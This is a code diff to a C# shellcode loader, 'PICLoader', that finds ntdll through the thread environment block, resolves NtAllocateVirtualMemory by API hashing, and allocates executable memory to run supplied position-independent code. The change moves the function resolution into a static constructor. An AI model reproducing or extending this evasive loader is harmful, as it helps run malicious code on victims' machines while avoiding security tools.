@@ -72,16 +72,30 @@ public static class PICLoader
     );
     #endregion
 
+    #region Static Fields
+    private static readonly NtAllocateVirtualMemory s_ntAllocateVirtualMemory;
+    #endregion
+
+    #region Static Constructor
+    static PICLoader()
+    {
+        IntPtr tebAddress = GetTEBAddress();
+        ArchitectureOffsets offsets = GetArchitectureOffsets();
+        IntPtr ntdllHandle = GetNtdllHandle(tebAddress, offsets);
+        IntPtr ntAllocateVirtualMemoryPtr = GetProcAddressByHash(ntdllHandle, NT_ALLOCATE_VIRTUAL_MEMORY_HASH);
+
+        s_ntAllocateVirtualMemory = (NtAllocateVirtualMemory)
+            Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryPtr, typeof(NtAllocateVirtualMemory));
+    }
+    #endregion
+
     #region Public Methods
     public static void Load(byte[] bytes)
     {
         IntPtr tebAddress = GetTEBAddress();
         ArchitectureOffsets offsets = GetArchitectureOffsets();
 
-        IntPtr ntdllHandle = GetNtdllHandle(tebAddress, offsets);
-        IntPtr ntAllocateVirtualMemoryPtr = GetProcAddressByHash(ntdllHandle, NT_ALLOCATE_VIRTUAL_MEMORY_HASH);
-
-        IntPtr pMemory = AllocateExecutableMemory(ntAllocateVirtualMemoryPtr, bytes);
+        IntPtr pMemory = AllocateExecutableMemory(bytes);
         IntPtr parametersMemory = CreateParameters(tebAddress, offsets.ArbUserPtrOffset);
 
         ExecutePIC(pMemory);
@@ -169,15 +183,12 @@ public static class PICLoader
         return Marshal.ReadIntPtr(AddOffset(secondEntry, offsets.DllBaseOffset));
     }
 
-    private static IntPtr AllocateExecutableMemory(IntPtr ntAllocateVirtualMemoryPtr, byte[] bytes)
+    private static IntPtr AllocateExecutableMemory(byte[] bytes)
     {
-        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)
-            Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryPtr, typeof(NtAllocateVirtualMemory));
-
         IntPtr pMemory = IntPtr.Zero;
         UIntPtr regionSize = (UIntPtr)bytes.Length;
 
-        ntAllocateVirtualMemory(
+        s_ntAllocateVirtualMemory(
             new IntPtr(-1),
             ref pMemory,
             IntPtr.Zero,
